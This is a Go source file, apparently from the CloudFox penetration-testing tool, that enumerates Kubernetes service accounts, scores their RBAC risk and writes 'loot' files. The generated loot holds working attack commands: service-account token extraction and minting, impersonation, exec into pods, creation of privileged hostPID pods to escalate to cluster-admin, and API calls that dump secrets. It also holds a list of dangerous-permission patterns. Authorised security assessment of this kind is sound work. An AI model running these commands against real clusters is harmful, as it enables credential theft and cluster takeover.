package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	rbacv1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

var ServiceAccountsCmd = &cobra.Command{
	Use:     "serviceaccounts",
	Aliases: []string{"sa"},
	Short:   "Enumerate service accounts with security analysis",
	Long: `
Enumerate all service accounts in the cluster with comprehensive security analysis including:
  - Risk-based scoring based on permissions and active usage
  - RBAC permission analysis with dangerous permission detection
  - Active usage tracking (which pods use which service accounts)
  - Token extraction and impersonation techniques
  - Privilege escalation paths via service account abuse

  cloudfox kubernetes serviceaccounts`,
	Run: ListServiceAccounts,
}

type ServiceAccountOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (s ServiceAccountOutput) TableFiles() []internal.TableFile {
	return s.Table
}

func (s ServiceAccountOutput) LootFiles() []internal.LootFile {
	return s.Loot
}

type SAFinding struct {
	Namespace             string
	Name                  string
	Secrets               []string
	AutoMountToken        string
	Roles                 []string
	ClusterRoles          []string
	PodsUsingSA           []string
	ImagePullSecrets      []string
	RiskLevel             string
	DangerousPermissions  []string
	PermissionSummary     string
	HasToken              bool
	ActivelyUsed          bool
}

func ListServiceAccounts(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating service accounts for %s", globals.ClusterName), globals.K8S_SERVICEACCOUNTS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing namespaces: %v", err), globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
		return
	}

	headers := []string{
		"Risk",
		"Namespace",
		"Service Account",
		"Active Pods",
		"Permissions Summary",
		"Roles",
		"ClusterRoles",
		"Has Token",
		"Auto-Mount Token",
	}

	var outputRows [][]string
	var findings []SAFinding

	// Risk level counters
	riskCounts := map[string]int{
		"CRITICAL": 0,
		"HIGH":     0,
		"MEDIUM":   0,
		"LOW":      0,
	}

	var lootEnum []string
	var lootTokens []string
	var lootImpersonate []string
	var lootExploit []string
	var lootPermissions []string

	lootEnum = append(lootEnum, `#####################################
##### ServiceAccount Enumeration
#####################################
#
# List and describe all service accounts
#
`)

	lootTokens = append(lootTokens, `#####################################
##### ServiceAccount Token Extraction
#####################################
#
# Extract and decode service account tokens
# IMPORTANT: Tokens provide authentication to the cluster
#
`)

	lootImpersonate = append(lootImpersonate, `#####################################
##### ServiceAccount Impersonation
#####################################
#
# Use service account tokens for authentication
# MANUAL EXECUTION REQUIRED
#
`)

	lootExploit = append(lootExploit, `#####################################
##### ServiceAccount Privilege Escalation
#####################################
#
# MANUAL EXECUTION REQUIRED
# Create pods to use privileged service accounts
# or abuse existing pods with high-privilege SAs
#
`)

	lootPermissions = append(lootPermissions, `#####################################
##### RBAC Permission Analysis
#####################################
#
# Detailed permission analysis for high-risk service accounts
# Focus on dangerous permissions that enable privilege escalation
#
`)

	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	// Build maps for RBAC bindings
	saRoleBindings := make(map[string]map[string][]string)      // ns -> sa -> []roles
	saClusterRoleBindings := make(map[string]map[string][]string) // ns -> sa -> []clusterroles
	saPods := make(map[string]map[string][]string)              // ns -> sa -> []pods

	// Get all roles and clusterroles for permission analysis
	allRoles := make(map[string]map[string]*rbacv1.Role)               // ns -> role name -> Role
	allClusterRoles := make(map[string]*rbacv1.ClusterRole)            // role name -> ClusterRole

	// Get all ClusterRoles
	clusterRoles, err := clientset.RbacV1().ClusterRoles().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing cluster roles: %v", err), globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
	} else {
		for _, cr := range clusterRoles.Items {
			allClusterRoles[cr.Name] = &cr
		}
	}

	// Get all ClusterRoleBindings
	clusterRoleBindings, err := clientset.RbacV1().ClusterRoleBindings().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing cluster role bindings: %v", err), globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
	} else {
		for _, crb := range clusterRoleBindings.Items {
			for _, subj := range crb.Subjects {
				if subj.Kind == "ServiceAccount" {
					ns := subj.Namespace
					sa := subj.Name
					if saClusterRoleBindings[ns] == nil {
						saClusterRoleBindings[ns] = make(map[string][]string)
					}
					saClusterRoleBindings[ns][sa] = append(saClusterRoleBindings[ns][sa], crb.RoleRef.Name)
				}
			}
		}
	}

	// Process each namespace
	for _, ns := range namespaces.Items {
		// Get all roles in namespace
		roles, err := clientset.RbacV1().Roles(ns.Name).List(ctx, metav1.ListOptions{})
		if err == nil {
			allRoles[ns.Name] = make(map[string]*rbacv1.Role)
			for _, role := range roles.Items {
				allRoles[ns.Name][role.Name] = &role
			}
		}

		// Get all pods in namespace to map SA usage
		pods, err := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error listing pods in namespace %s: %v", ns.Name, err), globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
		} else {
			for _, pod := range pods.Items {
				// Only count running pods for "active usage"
				if pod.Status.Phase == corev1.PodRunning || pod.Status.Phase == corev1.PodPending {
					saName := pod.Spec.ServiceAccountName
					if saName == "" {
						saName = "default"
					}
					if saPods[ns.Name] == nil {
						saPods[ns.Name] = make(map[string][]string)
					}
					saPods[ns.Name][saName] = append(saPods[ns.Name][saName], pod.Name)
				}
			}
		}

		// Get RoleBindings in namespace
		roleBindings, err := clientset.RbacV1().RoleBindings(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error listing role bindings in namespace %s: %v", ns.Name, err), globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
		} else {
			for _, rb := range roleBindings.Items {
				for _, subj := range rb.Subjects {
					if subj.Kind == "ServiceAccount" {
						sa := subj.Name
						if saRoleBindings[ns.Name] == nil {
							saRoleBindings[ns.Name] = make(map[string][]string)
						}
						saRoleBindings[ns.Name][sa] = append(saRoleBindings[ns.Name][sa], rb.RoleRef.Name)
					}
				}
			}
		}

		// Get ServiceAccounts
		serviceAccounts, err := clientset.CoreV1().ServiceAccounts(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error listing service accounts in namespace %s: %v", ns.Name, err), globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
			continue
		}

		for _, sa := range serviceAccounts.Items {
			finding := SAFinding{
				Namespace: ns.Name,
				Name:      sa.Name,
			}

			// Get secrets
			var secretNames []string
			for _, secret := range sa.Secrets {
				secretNames = append(secretNames, secret.Name)
			}
			finding.Secrets = secretNames
			finding.HasToken = len(secretNames) > 0

			// Auto-mount token setting
			autoMount := "true (default)"
			if sa.AutomountServiceAccountToken != nil {
				if *sa.AutomountServiceAccountToken {
					autoMount = "true"
				} else {
					autoMount = "false"
				}
			}
			finding.AutoMountToken = autoMount

			// Get roles bound to this SA
			roles := saRoleBindings[ns.Name][sa.Name]
			clusterRoles := saClusterRoleBindings[ns.Name][sa.Name]
			finding.Roles = roles
			finding.ClusterRoles = clusterRoles

			// Get pods using this SA
			podsUsingSA := saPods[ns.Name][sa.Name]
			finding.PodsUsingSA = podsUsingSA
			finding.ActivelyUsed = len(podsUsingSA) > 0

			// Get image pull secrets
			var imagePullSecrets []string
			for _, ips := range sa.ImagePullSecrets {
				imagePullSecrets = append(imagePullSecrets, ips.Name)
			}
			finding.ImagePullSecrets = imagePullSecrets

			// Analyze permissions
			dangerousPerms, permSummary := analyzePermissions(ns.Name, roles, clusterRoles, allRoles, allClusterRoles)
			finding.DangerousPermissions = dangerousPerms
			finding.PermissionSummary = permSummary

			// Calculate risk level
			finding.RiskLevel = calculateSARiskLevel(
				finding.ClusterRoles,
				finding.DangerousPermissions,
				finding.ActivelyUsed,
				finding.HasToken,
			)
			riskCounts[finding.RiskLevel]++
			findings = append(findings, finding)

			// Format output row
			hasTokenStr := "No"
			if finding.HasToken {
				hasTokenStr = "Yes"
			}

			activePodStr := fmt.Sprintf("%d", len(podsUsingSA))
			if len(podsUsingSA) == 0 {
				activePodStr = "0 (unused)"
			}

			outputRows = append(outputRows, []string{
				finding.RiskLevel,
				ns.Name,
				sa.Name,
				activePodStr,
				permSummary,
				strings.Join(k8sinternal.Unique(roles), ", "),
				strings.Join(k8sinternal.Unique(clusterRoles), ", "),
				hasTokenStr,
				autoMount,
			})

			// Generate enumeration commands
			lootEnum = append(lootEnum, fmt.Sprintf("\n# [%s] ServiceAccount: %s/%s", finding.RiskLevel, ns.Name, sa.Name))
			lootEnum = append(lootEnum, fmt.Sprintf("kubectl get serviceaccount %s -n %s -o yaml", sa.Name, ns.Name))
			lootEnum = append(lootEnum, fmt.Sprintf("kubectl describe serviceaccount %s -n %s", sa.Name, ns.Name))

			// Show RBAC permissions
			if len(roles) > 0 {
				lootEnum = append(lootEnum, fmt.Sprintf("# Roles: %s", strings.Join(roles, ", ")))
				for _, role := range roles {
					lootEnum = append(lootEnum, fmt.Sprintf("kubectl get role %s -n %s -o yaml", role, ns.Name))
				}
			}
			if len(clusterRoles) > 0 {
				lootEnum = append(lootEnum, fmt.Sprintf("# ClusterRoles: %s", strings.Join(clusterRoles, ", ")))
				for _, cr := range clusterRoles {
					lootEnum = append(lootEnum, fmt.Sprintf("kubectl get clusterrole %s -o yaml", cr))
				}
			}
			lootEnum = append(lootEnum, "")

			// Permission analysis for high-risk SAs
			if finding.RiskLevel == "CRITICAL" || finding.RiskLevel == "HIGH" {
				lootPermissions = append(lootPermissions, fmt.Sprintf("\n### [%s] %s/%s", finding.RiskLevel, ns.Name, sa.Name))
				lootPermissions = append(lootPermissions, fmt.Sprintf("# Permissions: %s", permSummary))
				if len(dangerousPerms) > 0 {
					lootPermissions = append(lootPermissions, "# Dangerous Permissions:")
					for _, perm := range dangerousPerms {
						lootPermissions = append(lootPermissions, fmt.Sprintf("#   - %s", perm))
					}
				}
				if len(podsUsingSA) > 0 {
					lootPermissions = append(lootPermissions, fmt.Sprintf("# Active in %d pods:", len(podsUsingSA)))
					for _, pod := range podsUsingSA {
						lootPermissions = append(lootPermissions, fmt.Sprintf("#   - %s", pod))
					}
				}
				lootPermissions = append(lootPermissions, "# Test permissions:")
				if finding.HasToken && len(secretNames) > 0 {
					lootPermissions = append(lootPermissions, fmt.Sprintf("export SA_TOKEN=$(kubectl get secret %s -n %s -o jsonpath='{.data.token}' | base64 -d)", secretNames[0], ns.Name))
				} else {
					lootPermissions = append(lootPermissions, fmt.Sprintf("export SA_TOKEN=$(kubectl create token %s -n %s --duration=24h)", sa.Name, ns.Name))
				}
				lootPermissions = append(lootPermissions, "kubectl --token=$SA_TOKEN auth can-i --list")
				lootPermissions = append(lootPermissions, "")
			}

			// Token extraction
			if len(secretNames) > 0 {
				lootTokens = append(lootTokens, fmt.Sprintf("\n# [%s] ServiceAccount: %s/%s", finding.RiskLevel, ns.Name, sa.Name))
				for _, secretName := range secretNames {
					lootTokens = append(lootTokens, fmt.Sprintf("# Secret: %s", secretName))
					lootTokens = append(lootTokens, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.token}' | base64 -d", secretName, ns.Name))
					lootTokens = append(lootTokens, fmt.Sprintf("# Decode token (paste output above):"))
					lootTokens = append(lootTokens, fmt.Sprintf("# echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq ."))
				}
				lootTokens = append(lootTokens, "")
			}

			// Impersonation commands
			lootImpersonate = append(lootImpersonate, fmt.Sprintf("\n# [%s] ServiceAccount: %s/%s", finding.RiskLevel, ns.Name, sa.Name))
			if len(dangerousPerms) > 0 {
				lootImpersonate = append(lootImpersonate, fmt.Sprintf("# Dangerous Permissions: %s", strings.Join(dangerousPerms, ", ")))
			}
			lootImpersonate = append(lootImpersonate, fmt.Sprintf("# Extract token and set as environment variable:"))
			if len(secretNames) > 0 {
				lootImpersonate = append(lootImpersonate, fmt.Sprintf("export SA_TOKEN=$(kubectl get secret %s -n %s -o jsonpath='{.data.token}' | base64 -d)", secretNames[0], ns.Name))
			} else {
				lootImpersonate = append(lootImpersonate, fmt.Sprintf("# No token secret found - create one:"))
				lootImpersonate = append(lootImpersonate, fmt.Sprintf("export SA_TOKEN=$(kubectl create token %s -n %s --duration=24h)", sa.Name, ns.Name))
			}
			lootImpersonate = append(lootImpersonate, fmt.Sprintf("# Use token with kubectl:"))
			lootImpersonate = append(lootImpersonate, fmt.Sprintf("kubectl --token=$SA_TOKEN auth can-i --list"))
			lootImpersonate = append(lootImpersonate, fmt.Sprintf("kubectl --token=$SA_TOKEN get pods -n %s", ns.Name))
			lootImpersonate = append(lootImpersonate, "")

			// Privilege escalation - focus on CRITICAL/HIGH risk SAs
			if finding.RiskLevel == "CRITICAL" || finding.RiskLevel == "HIGH" {
				lootExploit = append(lootExploit, fmt.Sprintf("\n### [%s] ServiceAccount: %s/%s", finding.RiskLevel, ns.Name, sa.Name))
				lootExploit = append(lootExploit, fmt.Sprintf("# Permissions: %s", permSummary))

				if len(podsUsingSA) > 0 {
					// Exploit existing pods
					lootExploit = append(lootExploit, fmt.Sprintf("# OPTION 1: Exploit existing pods using this SA"))
					for _, pod := range podsUsingSA {
						lootExploit = append(lootExploit, fmt.Sprintf("#   Pod: %s", pod))
						lootExploit = append(lootExploit, fmt.Sprintf("kubectl exec -it %s -n %s -- sh", pod, ns.Name))
						lootExploit = append(lootExploit, "# Inside pod:")
						lootExploit = append(lootExploit, "# SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)")
						lootExploit = append(lootExploit, "# kubectl --token=$SA_TOKEN auth can-i --list")
						lootExploit = append(lootExploit, "")
					}
				}

				// Create new pod with this SA
				lootExploit = append(lootExploit, fmt.Sprintf("# OPTION 2: Create a new pod using this ServiceAccount:"))
				lootExploit = append(lootExploit, fmt.Sprintf(`cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod-%s
  namespace: %s
spec:
  serviceAccountName: %s
  containers:
  - name: shell
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "apk add --no-cache curl && sleep 3600"]
EOF`, sa.Name, ns.Name, sa.Name))
				lootExploit = append(lootExploit, fmt.Sprintf("# Wait for pod to be ready, then exec:"))
				lootExploit = append(lootExploit, fmt.Sprintf("kubectl wait --for=condition=ready pod/privesc-pod-%s -n %s --timeout=60s", sa.Name, ns.Name))
				lootExploit = append(lootExploit, fmt.Sprintf("kubectl exec -it privesc-pod-%s -n %s -- /bin/sh", sa.Name, ns.Name))
				lootExploit = append(lootExploit, "# Inside pod, extract and use token:")
				lootExploit = append(lootExploit, "SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)")
				lootExploit = append(lootExploit, "APISERVER=https://kubernetes.default.svc")
				lootExploit = append(lootExploit, "CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")

				// Specific exploitation based on permissions
				if contains(dangerousPerms, "create pods") || contains(dangerousPerms, "create *") {
					lootExploit = append(lootExploit, "# This SA can create pods - escalate to cluster-admin:")
					lootExploit = append(lootExploit, `curl --cacert $CACERT --header "Authorization: Bearer $SA_TOKEN" -X POST \
  $APISERVER/api/v1/namespaces/default/pods -H 'Content-Type: application/json' -d '{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "hostpath-pod"},
  "spec": {
    "hostPID": true,
    "hostNetwork": true,
    "containers": [{
      "name": "shell",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "sleep 3600"],
      "securityContext": {"privileged": true}
    }]
  }
}'`)
				}

				if contains(dangerousPerms, "get secrets") || contains(dangerousPerms, "list secrets") {
					lootExploit = append(lootExploit, "# This SA can read secrets - extract sensitive data:")
					lootExploit = append(lootExploit, fmt.Sprintf("curl --cacert $CACERT --header \"Authorization: Bearer $SA_TOKEN\" $APISERVER/api/v1/namespaces/%s/secrets", ns.Name))
				}

				if contains(dangerousPerms, "exec pods") {
					lootExploit = append(lootExploit, "# This SA can exec into pods - pivot to other workloads:")
					lootExploit = append(lootExploit, fmt.Sprintf("kubectl --token=$SA_TOKEN get pods -n %s", ns.Name))
					lootExploit = append(lootExploit, "kubectl --token=$SA_TOKEN exec -it <pod-name> -- sh")
				}

				lootExploit = append(lootExploit, "")
			}
		}
	}

	// Add summaries
	if riskCounts["CRITICAL"] > 0 || riskCounts["HIGH"] > 0 {
		summary := fmt.Sprintf(`
# SUMMARY: Risk Distribution
# CRITICAL: %d service accounts
# HIGH: %d service accounts
# MEDIUM: %d service accounts
# LOW: %d service accounts
#
# Focus on CRITICAL and HIGH risk service accounts for maximum impact.
`, riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"])

		lootPermissions = append([]string{summary}, lootPermissions...)
		lootExploit = append([]string{summary}, lootExploit...)
	}

	table := internal.TableFile{
		Name:   "ServiceAccounts",
		Header: headers,
		Body:   outputRows,
	}

	lootFiles := []internal.LootFile{
		{
			Name:     "ServiceAccounts-Enum",
			Contents: strings.Join(lootEnum, "\n"),
		},
		{
			Name:     "ServiceAccounts-Token-Extraction",
			Contents: strings.Join(lootTokens, "\n"),
		},
		{
			Name:     "ServiceAccounts-Impersonation",
			Contents: strings.Join(lootImpersonate, "\n"),
		},
		{
			Name:     "ServiceAccounts-Privilege-Escalation",
			Contents: strings.Join(lootExploit, "\n"),
		},
		{
			Name:     "ServiceAccounts-RBAC-Analysis",
			Contents: strings.Join(lootPermissions, "\n"),
		},
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"ServiceAccounts",
		globals.ClusterName,
		"results",
		ServiceAccountOutput{
			Table: []internal.TableFile{table},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d service accounts found across %d namespaces | Risk: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
			len(outputRows), len(namespaces.Items),
			riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"]),
			globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
	} else {
		logger.InfoM("No service accounts found, skipping output file creation", globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_SERVICEACCOUNTS_MODULE_NAME), globals.K8S_SERVICEACCOUNTS_MODULE_NAME)
}

// ====================
// Helper Functions
// ====================

func analyzePermissions(namespace string, roles, clusterRoles []string,
	allRoles map[string]map[string]*rbacv1.Role, allClusterRoles map[string]*rbacv1.ClusterRole) ([]string, string) {

	var dangerousPerms []string
	var allPerms []string

	// Dangerous permission patterns to detect
	dangerousPatterns := map[string]bool{
		"create pods":           true,
		"create *":              true,
		"* pods":                true,
		"* *":                   true,
		"get secrets":           true,
		"list secrets":          true,
		"exec pods":             true,
		"create deployments":    true,
		"create daemonsets":     true,
		"create roles":          true,
		"create rolebindings":   true,
		"create clusterroles":   true,
		"create clusterrolebindings": true,
		"escalate":              true,
		"impersonate":           true,
		"bind":                  true,
	}

	// Analyze cluster roles
	for _, crName := range clusterRoles {
		// Check for well-known dangerous roles
		if crName == "cluster-admin" {
			dangerousPerms = append(dangerousPerms, "cluster-admin (full cluster access)")
			allPerms = append(allPerms, "cluster-admin")
			continue
		}
		if strings.Contains(strings.ToLower(crName), "admin") {
			dangerousPerms = append(dangerousPerms, fmt.Sprintf("%s (admin access)", crName))
		}

		// Analyze actual permissions
		if cr, ok := allClusterRoles[crName]; ok {
			for _, rule := range cr.Rules {
				perms := formatRulePermissions(rule)
				allPerms = append(allPerms, perms...)

				for _, perm := range perms {
					if dangerousPatterns[perm] {
						if !contains(dangerousPerms, perm) {
							dangerousPerms = append(dangerousPerms, perm)
						}
					}
				}
			}
		}
	}

	// Analyze namespace roles
	for _, roleName := range roles {
		if strings.Contains(strings.ToLower(roleName), "admin") || strings.Contains(strings.ToLower(roleName), "edit") {
			dangerousPerms = append(dangerousPerms, fmt.Sprintf("%s (elevated access)", roleName))
		}

		if nsRoles, ok := allRoles[namespace]; ok {
			if role, ok := nsRoles[roleName]; ok {
				for _, rule := range role.Rules {
					perms := formatRulePermissions(rule)
					allPerms = append(allPerms, perms...)

					for _, perm := range perms {
						if dangerousPatterns[perm] {
							if !contains(dangerousPerms, perm) {
								dangerousPerms = append(dangerousPerms, perm)
							}
						}
					}
				}
			}
		}
	}

	// Create summary
	summary := "<none>"
	if len(dangerousPerms) > 0 {
		// Limit to first 3 dangerous perms for summary
		if len(dangerousPerms) > 3 {
			summary = strings.Join(dangerousPerms[:3], ", ") + fmt.Sprintf(" (+%d more)", len(dangerousPerms)-3)
		} else {
			summary = strings.Join(dangerousPerms, ", ")
		}
	} else if len(allPerms) > 0 {
		// Show limited permissions if no dangerous ones
		if len(allPerms) > 3 {
			summary = strings.Join(allPerms[:3], ", ") + "..."
		} else {
			summary = strings.Join(allPerms, ", ")
		}
	}

	return dangerousPerms, summary
}

func formatRulePermissions(rule rbacv1.PolicyRule) []string {
	var perms []string

	for _, verb := range rule.Verbs {
		for _, resource := range rule.Resources {
			perm := fmt.Sprintf("%s %s", verb, resource)
			perms = append(perms, perm)
		}
	}

	return perms
}

func calculateSARiskLevel(clusterRoles, dangerousPerms []string, activelyUsed, hasToken bool) string {
	// CRITICAL: cluster-admin or equivalent
	for _, cr := range clusterRoles {
		if cr == "cluster-admin" {
			return "CRITICAL"
		}
	}

	// CRITICAL: Multiple dangerous permissions + actively used
	if len(dangerousPerms) >= 3 && activelyUsed {
		return "CRITICAL"
	}

	// HIGH: Dangerous permissions
	if len(dangerousPerms) > 0 {
		if activelyUsed {
			return "HIGH"
		}
		return "MEDIUM"
	}

	// HIGH: Admin-like roles + actively used
	for _, cr := range clusterRoles {
		if strings.Contains(strings.ToLower(cr), "admin") && activelyUsed {
			return "HIGH"
		}
	}

	// MEDIUM: Has permissions and actively used
	if len(clusterRoles) > 0 && activelyUsed {
		return "MEDIUM"
	}

	// LOW: Everything else
	return "LOW"
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
